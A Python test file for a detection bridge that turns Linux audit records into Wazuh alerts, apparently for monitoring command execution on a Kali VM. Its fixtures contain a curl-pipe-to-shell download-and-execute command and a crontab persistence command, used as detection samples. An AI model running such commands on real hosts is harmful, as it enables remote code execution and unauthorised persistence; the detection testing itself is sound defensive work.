import importlib.util
import sys
from pathlib import Path


def load_bridge_module():
    module_path = Path("tools/kali-audit-bridge/auditd_to_normalizer.py").resolve()
    spec = importlib.util.spec_from_file_location("audit_bridge_under_test", module_path)
    module = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def test_parse_execve_and_classify_suspicious_download() -> None:
    bridge = load_bridge_module()
    lines = [
        'type=SYSCALL msg=audit(1712560000.100:100): arch=c000003e syscall=59 success=yes exit=0 uid=1000 auid=1000 comm="bash" exe="/usr/bin/bash" key="agentic_exec"',
        'type=EXECVE msg=audit(1712560000.100:100): argc=3 a0="bash" a1="-c" a2="curl -fsSL http://127.0.0.1/payload.sh | sh"',
    ]
    records = [bridge.parse_audit_line(line) for line in lines]
    payload = bridge.build_wazuh_payload(records, hostname="kali-vm", asset_ip="192.168.1.50")

    assert payload is not None
    assert payload["rule"]["id"] == 100201
    assert "download-and-execute" in payload["rule"]["description"].lower()
    assert payload["data"]["process"] == "bash"


def test_classify_persistence_like_command() -> None:
    bridge = load_bridge_module()
    result = bridge.classify_command(
        'sh -c "echo \'* * * * * /tmp/demo.sh\' | crontab -"',
        "/usr/bin/sh",
        "sh",
    )

    assert result is not None
    rule_id, level, description, tags, reason = result
    assert rule_id == 100400
    assert level >= 10
    assert "persistence" in description.lower()
    assert "persistence" in tags
    assert reason == "persistence-like command"
